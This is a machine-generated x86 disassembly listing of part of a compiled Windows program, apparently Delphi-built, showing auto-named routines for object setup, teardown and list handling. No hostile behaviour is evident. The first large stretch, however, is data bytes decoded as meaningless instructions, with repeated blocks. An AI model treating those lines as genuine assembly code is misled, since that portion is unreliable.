add [ eax ] al
popad
jo r-xdata
inc edx
inc edx
add [ esp + edx + 0x337c0042 ] bh
inc eax
add ah bh
add [ edx + eax ] bh
add [ edi ] dh
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add ah dl
mov esi 0xfe040047
inc esp
add [ eax ] ah
add eax [ ebp ]
insb
add al [ ebp ]
enter 0x4482 0x0
cmp al 0x44
add [ eax - 0x47ffbb08 ] ah
cmc
inc esp
add [ eax ] dl
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax - 0x4e ] dh
inc esp
add [ edx + esi * 4 - 0x7283ffbc ] bl
inc esp
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add [ eax - 0x6bffbb72 ] al
xchg ecx eax
inc esp
add [ esp + ebx * 8 ] al
inc edi
add ah ch
rol [ eax + eax + 0x20 ] 0x1
mov bl 0x44
add [ esi + esi * 8 ] cl
inc esp
add al cl
test [ eax + eax - 0x68 ] 0xe1
inc edi
add [ esi + esi * 8 - 0x47bbffbc ] ch
inc esp
add al ch
mov edi 0xcc780047
inc esp
add [ esi + eax * 8 + 0x44 ] ah
add [ eax - 0x37 ] ah
inc esp
add [ eax - 0x43ffbb39 ] dl
retn
inc esp
add ah dl
adc al 0x42
jne r-xdata
add ah dl
add [ ebx + esi + 0x40 ] bh
add ah bh
or eax 0x33840042
inc eax
add [ eax + 0x33 ] bh
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] dh
mov esp 0x8df80047
inc ecx
add [ eax + 0x4210 ] dh
inc eax
add al cl
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
jne r-xdata
add [ edi ] al
sbb [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
add al dh
add al [ ebp ]
sbb bl cl
inc esp
add [ ecx * 4 - 0x2b47ffbf ] dl
outsd
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc edx
popad
jb r-xdata
outsd
insb
outsd
jb r-xdata
or eax 0x33840042
inc eax
add [ eax - 0x2d ] dl
inc esp
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ edi + edi * 4 + 0x2f00047 ] ah
inc ebp
add [ eax ] bl

popad
jo r-xdata
aam 0x47
add ah cl
mov bh 0x44
add [ ebp + ecx * 4 + 0x14d40044 ] dl
add [ eax - 0xbffb82c ] bh
jae r-xdata
cld
add [ esi + ebp * 2 + 0x20041 ] ch
pop es
inc ecx
arpl [ esi + ebp * 2 + 0x4d ] si
popad
outsb
add [ eax ] al
mov eax eax
inc esp
je r-xdata
inc edi
add [ eax ] al
sub_4771a7
add [ eax + 0x33 ] dh
inc eax
add [ ebp + 0x44 ] ch
add [ ebp + 0x44 ] bh
add [ ebx + esi + 0x33780040 ] al
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax - 0x46 ] al
inc edi
add [ ebx + 0x64e80044 ] ah
inc esp
add ah ah
inc esp
add al ch
arpl [ eax + eax + 0x4c ] ax
arpl [ eax + eax - 0x54 ] ax
arpl [ eax + eax ] ax
inc esp
add [ 0x650c0044 ] al
inc esp
add [ ecx ] dl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc esp
jb r-xdata
call 0x4c47b6c0
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
dec esp
jb r-xdata
inc esp
add al ch
arpl [ eax + eax + 0x4c ] ax
outsd
jb r-xdata
arpl [ eax + eax - 0x54 ] ax
arpl [ eax + eax ] ax
inc esp
add [ 0x650c0044 ] al
inc esp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + r-xdata ] dl
add [ eax ] al
adc edx [ ebx + eax * 2 + 0x61 ]
je r-xdata
inc edi
add [ ebx + 0x64e80044 ] ah
inc esp
add ah ah
inc esp
add al ch
arpl [ eax + eax + 0x4c ] ax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x72 ] dh
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x4c004772 ] al
add [ eax ] al
add [ ecx + esi * 2 + 0x47 ] bh
add [ eax + 0x33 ] dh
inc eax
add [ ebp + 0x44 ] ch
add [ ebp + 0x44 ] bh
add [ ebx + esi + 0x33780040 ] al
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax - 0x46 ] al
mov [ ecx ] dl
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
insb
jae r-xdata
add [ 0x74634154 ] dl
imul ebp [ edi + 0x6e ] 0x6d657449
inc esp
inc esp
jb r-xdata
xor al 0xe7
je r-xdata
inc edx
add [ esp + edi * 4 + 0x11980047 ] dl
inc edx
add [ eax - 0x2bffbdee ] dl
adc al 0x42
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add ah ah
mov ebx 0xbd0c0047
inc edi
add [ ebp + edi * 4 + 0x47 ] dh
add al cl
mov ebp 0x54180047
inc ebx
jne r-xdata
inc edi
add al bh
lea eax [ ecx ]
mov al 0x10
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
jae r-xdata
arpl [ eax + eax - 0x54 ] ax
arpl [ eax + eax ] ax
inc esp
add [ 0x650c0044 ] al
inc esp
call 0x4c47b758
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
in al 0x72
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
jae r-xdata
add [ eax ] al
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc edx
popad
jb r-xdata
mov esi 0x11880047
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x6fffb88d ] ch
add [ eax ] al
add [ eax - 0x43ffbe93 ] dh
adc al 0x42
inc esp
add [ 0x54150044 ] cl
add [ eax + eax ] al
add ah dh
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
jne r-xdata
outsd
insb
outsd
jb r-xdata
inc esp
jb r-xdata
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec ecx
je r-xdata
add [ eax + 0x33 ] dh
inc eax
add [ ebp + 0x44 ] ch
add [ ebp + 0x44 ] bh
add [ ebx + esi + 0x33780040 ] al
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
lodsb [ esi ]
mov edx 0x64e80047
inc esp
add ah ah
inc edi
add ah dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x2bffb88b ] dl
add [ eax ] al
popad
jo r-xdata
inc edx
inc edx
add [ esp + edx + 0x337c0042 ] bh
inc eax
add ah bh
add [ edx + eax ] bh
add [ edi ] dh
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add ah dl
mov esi 0xfe040047
inc esp
add [ eax ] ah
add eax [ ebp ]
insb
add al [ ebp ]
enter 0x4482 0x0
cmp al 0x44
add [ eax - 0x47ffbb08 ] ah
cmc
inc esp
add [ eax ] dl
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax - 0x4e ] dh
inc esp
add [ edx + esi * 4 - 0x7283ffbc ] bl
inc esp
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add [ eax - 0x6bffbb72 ] al
xchg ecx eax
inc esp
add [ esp + ebx * 8 ] al
inc edi
add ah ch
rol [ eax + eax + 0x20 ] 0x1
mov bl 0x44
add [ esi + esi * 8 ] cl
inc esp
add al cl
test [ eax + eax - 0x68 ] 0xe1
inc edi
add [ esi + esi * 8 - 0x47bbffbc ] ch
inc esp
add al ch
mov edi 0xcc780047
inc esp
add [ esi + eax * 8 + 0x44 ] ah
add [ eax - 0x37 ] ah
inc esp
add [ eax - 0x43ffbb39 ] dl
retn
inc esp
add ah dl
adc al 0x42
jne r-xdata
add ah dl
add [ ebx + esi + 0x40 ] bh
add ah bh
or eax 0x33840042
inc eax
add [ eax + 0x33 ] bh
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] dh
mov esp 0x8df80047
inc ecx
add [ eax + 0x4210 ] dh
inc eax
add al cl
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
jne r-xdata
add [ edi ] al
sbb [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
add al dh
add al [ ebp ]
sbb bl cl
inc esp
add [ ecx * 4 - 0x2b47ffbf ] dl
outsd
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc edx
popad
jb r-xdata
outsd
insb
outsd
jb r-xdata
or eax 0x33840042
inc eax
add [ eax - 0x2d ] dl
inc esp
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ edi + edi * 4 + 0x2f00047 ] ah
inc ebp
add [ eax ] bl

popad
jo r-xdata
aam 0x47
add ah cl
mov bh 0x44
add [ ebp + ecx * 4 + 0x14d40044 ] dl
add [ eax - 0xbffb82c ] bh
jae r-xdata
cld
add [ esi + ebp * 2 + 0x20041 ] ch
pop es
inc ecx
arpl [ esi + ebp * 2 + 0x4d ] si
popad
outsb
add [ eax ] al
mov eax eax
inc esp
je r-xdata
inc edi
add [ eax ] al
sub_477520
and ch cl
inc edi
add [ edx + ebx * 8 - 0x261bffb9 ] dl
inc edi
add [ eax ] dh
inc edi
add ah dl
into
inc edi
add [ edx + edx * 8 + 0x47 ] cl
add al bl
rol [ edi ] cl
mov bl dl
inc edi
add [ eax - 0x24 ] cl
inc edi
add al bh
fadd [ edi ]
mov esp 0x540047dd
rol [ edi ] cl
cld
loop r-xdata
jpo r-xdata
add [ eax ] al
aam 0x47
add [ esp + edx * 8 - 0x3653ffb9 ] cl
inc edi
add [ eax - 0x2b ] cl
inc edi
add [ esi + ebx * 8 ] bh
inc edi
add [ esi + edx * 8 ] bl
inc edi
add ah bh
fild [ edi ]
and dl 0x47
add [ eax - 0x13ffb82a ] bl
fadd [ edi ]
rcr cl 0x1
inc edi
add [ eax + 0x47d9 ] al
into
inc edi
add [ ecx + 0x47 ] al
add [ ebx + ebp * 8 ] dh
inc edi
add [ ebx ] cl
add [ eax + esi * 4 ] cl
adc al 0xb0
or [ ebp + 0xf007bb0 ] esi
add dl ch
push [ ebx - 0x32002101 ]
dec ebx
dec [ eax - 0x43ffb83f ]
0xde300047 0x47
verw dx
sub_47760a
arpl [ esi + ebp * 2 + 0x4d ] si
popad
outsb
add [ eax ] al
mov eax eax
pushad
jbe r-xdata
inc edi
add al bl
mov al 0x44
add al dl
movsb [ edi ] [ esi ]
inc esp
add [ ecx * 4 - 0x4f5fffbf ] dl
inc esp
add [ esp + eax * 4 + 0x44 ] dl
add al al
add [ eax + eax - 0x6c ] 0xffffff8d
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 2 + 0x47 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
ja r-xdata
inc esp
add ah dl
adc al 0x42
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add [ ebx + ebp * 8 + 0x47 ] bl
add [ eax - 0x61 ] ch
inc esp
add [ edi + ebx * 4 + 0x44 ] ah
add [ eax ] dh
inc esp
add al ah
add eax 0x8a340048
inc esp
add [ eax - 0x3fffbb77 ] bl
xchg edx eax
inc esp
add [ eax ] dl
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax - 0x4e ] dh
inc esp
add [ edx + esi * 4 - 0x7283ffbc ] bl
inc esp
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add [ eax - 0x6bffbb72 ] al
xchg ecx eax
inc esp
add [ eax - 0x70 ] al
inc esp
add [ edx + 0x44 ] ah
add al bh
add eax 0x94800048
inc esp
add [ edx * 4 - 0x7abfffbc ] ch
inc esp
add [ edx * 4 - 0x6bfffbc ] cl
inc edi
add [ ebp * 8 + 0x8340047 ] ah
dec eax
add [ eax ] bh
add eax 0x5780048
dec eax
add [ ecx + eax ] cl
dec eax
add al dl
int1
inc edi
add [ eax - 0xe ] ah
inc edi
add al al
add [ edx - 0x5bffb889 ] bl
add [ eax ] eax
add [ edx + edx * 2 + 0x14bc0044 ] al
inc edx
add [ ebx + esi + 0x40 ] bh
add ah bh
or eax 0x33840042
inc eax
add al bh
mov [ 0x30c00044 ] eax
inc eax
add ah bl
xor [ eax ] al
add al 0xec
sub_477a18
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ ebx + 0x47 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
jpe r-xdata
inc ecx
add ah ch
stosd [ edi ]
inc ecx
add [ eax - 0x54 ] cl
add [ eax ] dh
add [ eax ] al
add [ 0x33700041 ] bl
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ ebx - 0x13ae00f8 ] cl
je r-xdata
inc ecx
add [ ebp * 4 - 0x59f3ffbf ] bl
inc ecx
add [ eax - 0x53 ] bl
inc ecx
add ah cl
lodsd [ esi ]
inc ecx
add al dh
cmpsd [ esi ] [ edi ]
inc ecx
add ah bh
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax - 0x67 ] al
inc ecx
add [ eax - 0x27ffbe58 ] bl
test al 0x41
add [ ecx + ebp * 4 + 0x41 ] al
add [ esi + ebx * 4 + 0x41 ] ch
add ah dl
stosb [ edi ]
inc ecx
add [ eax ] al
mov eax [ 0xffffffffa1d40041 ]
inc ecx
add [ eax ] dl
stosd [ edi ]
inc ecx
add [ eax ] ah
stosd [ edi ]
inc ecx
add [ eax ] bh
mov [ 0xffffffffa28c0041 ] al
inc ecx
add [ eax ] bh
mov [ 0xffffffffa4d00041 ] eax
inc ecx
add [ eax ] ch
movsd [ edi ] [ esi ]
inc ecx
add [ ebp - 0x579fffbf ] bh
inc ecx
add [ eax + ebp * 4 + 0x41 ] bh
add [ ebx + ebp * 4 + 0x41 ] dh
add ah al
test eax 0xad840041
inc ecx
add [ ebp + ebp * 4 + 0x54130041 ] dl
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc edx
popad
jb r-xdata
lodsb [ esi ]
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ edi - 0x7207ffbf ] dl
inc ecx
add [ eax ] al
fwait
inc ecx
add al bh
cdq
inc ecx
add [ edx + ebp * 4 ] bh
inc ecx
add [ eax - 0x56 ] dh
inc ecx
add [ edx + ebp * 4 + 0x41 ] dh
add [ eax - 0x56 ] bh
inc ecx
add al al
sahf
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_44ec5c
je r-xdata
insb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
adc edx [ ecx + eax * 2 + 0x63 ]
je r-xdata
retn
cmp [ eax + 0x224 ] 0x0
je r-xdata
adc eax 0x224b880
add [ eax ] al
add [ esp + ecx - 0x75 ] dh
shl [ ecx + rw-data ] 0x1
outsd
outsb
inc edx
popad
jb sub_477b70
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov edx eax
mov eax [ rw-data ]
je sub_477b98
insb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
or al 0x66
inc ecx
add [ eax ] al
add [ edi ] al
inc ecx
arpl [ esi + ebp * 2 + 0x4d ] si
popad
outsb
add [ eax ] al
lea eax [ eax ]
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov edx ebx
mov ecx [ rw-data ]
mov ecx [ eax ]
call [ ecx - 0x14 ]
sub_477b70
cmp [ rw-data ] 0x0
je r-xdata
retn
test eax eax
je r-xdata
mov edx eax
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
test eax eax
je r-xdata
cmp [ eax + 0x224 ] 0x0
je r-xdata
sub_477b98
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x14 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_477c77
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_455538
and [ esi + 0x24 ] 0xfe
mov eax esi
call sub_477d74
mov [ esi + 0x6c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov edi eax
mov [ esi + 0x94 ] edi
mov eax edi
mov edx [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax [ esi + 0x94 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
add esp 0xfffffff0
call sub_40348c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477c7e
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403edc
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
mov edi [ esi + 0x94 ]
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_419e08
mov edx [ ebp - 0x14 ]
lea ecx [ ebp - 0x10 ]
mov eax edi
call sub_419fe8
mov eax [ ebp - 0x10 ]
call sub_4081e4
mov ecx eax
mov edx [ ebp - 0x8 ]
mov eax edi
mov edi [ eax ]
call [ edi + 0x24 ]
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
sub_477c7e
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_477c9c
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax [ esi + 0x94 ]
call sub_403128
mov eax [ esi + 0x6c ]
call sub_403128
mov eax [ esi + 0x88 ]
call sub_403128
mov eax [ esi + 0x84 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4555a4
test bl bl
jle r-xdata
call sub_403128
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_477cf0
push esi
push edi
push ebp
mov edi edx
mov esi eax
mov edx edi
mov eax esi
call sub_418d14
mov eax edi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
pop ebp
pop edi
pop esi
retn
mov ebp edi
mov edx [ ebp + 0x6c ]
mov eax [ esi + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
lea eax [ esi + 0x8c ]
mov edx [ ebp + 0x8c ]
call sub_403f0c
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x94 ]
mov eax [ esi + 0x94 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
cmp [ ebp + 0x84 ] 0x0
je r-xdata
mov edx [ ebp + 0x38 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax ebp
call sub_478bc4
push eax
mov eax esi
call sub_478bc4
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_477d74
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffee
call sub_403324
push eax
mov eax ebx
mov si 0xffef
call sub_403324
mov ecx ebx
mov dl 0x1
call sub_47a264
pop esi
pop ebx
retn
sub_477d9c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0xc8 ] 0x0
setne al
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov edx [ edx + 0xc8 ]
mov ecx [ ebp + 0x8 ]
cmp edx [ eax + 0xc8 ]
setne al
pop ebp
retn
sub_477dd8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4210b0
mov eax [ ebp - 0x8 ]
push eax
push sub_478bf4
mov eax [ ebp - 0x8 ]
push eax
push sub_478cd4
push ebp
call sub_477d9c
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_477e34
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi ecx
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor ebp ebp
test esi esi
jne r-xdata
mov eax esi
call sub_419538
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ esp ]
mov esi [ eax + 0x6c ]
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebx ebx
mov edx ebx
mov eax esi
call sub_479030
call sub_479bb4
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_479030
call sub_47b0a8
cmp eax [ esp + 0x4 ]
jne r-xdata
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_479030
call sub_479bf4
mov ecx eax
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_477e34
mov ebp eax
test ebp ebp
jne r-xdata
mov edx ebx
mov eax esi
call sub_479030
mov ebp eax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_479030
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
sub_477edc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi ecx
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor ebp ebp
test esi esi
jne r-xdata
mov eax esi
call sub_419538
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ esp ]
mov esi [ eax + 0x6c ]
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebx ebx
mov edx ebx
mov eax esi
call sub_479030
call sub_479bb4
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_479030
mov ebp eax
jmp r-xdata
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_479030
call sub_479bf4
mov ecx eax
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_477edc
mov ebp eax
test ebp ebp
jne r-xdata
mov edx ebx
mov eax esi
call sub_479030
mov eax [ eax + 0xc ]
cmp eax [ esp + 0x4 ]
jne r-xdata
sub_477f6c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_478068
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x20
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b300
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_478046
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_477fd4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_47807c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47804d
lea eax [ ebp - 0x8 ]
call sub_40d31c
retn
sub_477fd9
lea eax [ ebp - 0x8 ]
call sub_40d31c
push 0x0
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405c78
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x18 ]
xor ecx ecx
pop eax
call sub_408f48
mov eax [ ebp - 0xc ]
mov cx [ r-xdata ]
mov dl 0x1
call sub_4315ac
cmp eax 0x6
jne r-xdata
call sub_403970
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47804d
lea eax [ ebp - 0x8 ]
call sub_40d31c
retn
mov eax [ ebp - 0x4 ]
call sub_4086a4
sub_47807c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x90 ] 0x1
xor eax eax
push ebp
push sub_478163
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_477d74
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x88 ] ebx
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
push ebp
push j_sub_403608#4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_41b574
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_41ae08
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41b178
mov eax [ ebp - 0x4 ]
call sub_421188
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0x4 ]
call sub_4785a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47816a
mov eax [ ebp - 0x4 ]
mov [ eax + 0x90 ] 0x0
mov eax [ ebp - 0x8 ]
call sub_403128
retn
sub_478174
push ebx
push esi
push edi
push ebp
mov ebx eax
mov eax ebx
call sub_421188
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx [ ebx + 0x6c ]
mov eax ebx
call sub_4785a0
mov eax [ ebx + 0x8c ]
call sub_408694
test al al
je r-xdata
mov eax [ ebx + 0x6c ]
call sub_419538
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x6c ]
inc [ eax + 0x28 ]
mov edx [ ebx + 0x8c ]
mov eax ebx
call sub_477f6c
jmp r-xdata
inc edi
xor esi esi
test [ ebx + 0x1c ] 0x10
jne r-xdata
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_47a300
mov eax [ eax + 0xc ]
call sub_47ea90
mov ebp eax
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_47a300
mov eax [ eax + 0xc ]
cmp ebp [ eax + 0x274 ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_47a300
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_47a300
mov eax [ eax + 0xc ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x12c ]
sub_478234
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
mov cl [ ebp - 0x1 ]
mov edx edi
mov eax ebx
call sub_4556c8
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
mov eax [ ebx + 0x8c ]
call sub_404178
test eax eax
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
test [ ebx + 0x1c ] 0x8
jne r-xdata
cmp [ ebx + 0x98 ] 0x0
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edx [ ebx + 0x8c ]
mov eax ebx
call sub_47842c
mov [ ebx + 0x98 ] 0x1
mov eax edi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
xor ecx ecx
mov edx edi
mov eax ebx
call sub_477e34
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_478385
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov ecx [ ebx + 0x6c ]
mov esi edi
mov edx esi
mov eax ebx
call sub_477edc
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax esi
call sub_47b09c
mov eax [ eax + 0x20 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebx + 0x84 ] 0x0
je r-xdata
